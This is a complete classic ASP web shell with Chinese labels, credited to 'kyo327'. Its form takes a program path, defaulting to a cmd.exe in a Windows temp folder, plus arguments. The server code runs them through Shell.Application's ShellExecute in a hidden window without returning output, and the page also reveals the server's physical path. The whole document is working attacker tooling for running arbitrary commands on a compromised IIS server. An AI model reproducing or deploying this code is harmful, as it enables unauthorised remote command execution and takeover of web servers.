<center><%response.write "<font size=4 color=red>shellapplication执行命令 无回显</font>" %> 
<BR>程序所在的物理路径： 
<%response.write request.servervariables("APPL_PHYSICAL_PATH")%> </center>
<html><title>shellapplication执行命令 by kyo327 </title> 
<body><br/><center>
<form action="<%= Request.ServerVariables("URL") %>" method="POST"> 
<br>程序路径：<br/>
<input type=text name=text1 size=60 value="C:\windows\temp\Cookies\cmd.exe"> <br/>
参数：<br/><input type=text name=text2 size=60 value="<%=canshu%>"><br/> 
<input type=submit name=makelove value=运行> 
</form> </center></body> </html> 
<% 
appnames = Request.Form("text1")
canshu = Request.Form("text2") 
if appnames<>"" then 
set kyoshell=createobject("shell.application")
kyoshell.ShellExecute appnames,canshu,"","open",0
response.write "<center>执行成功！</center>" 
end if 
%>
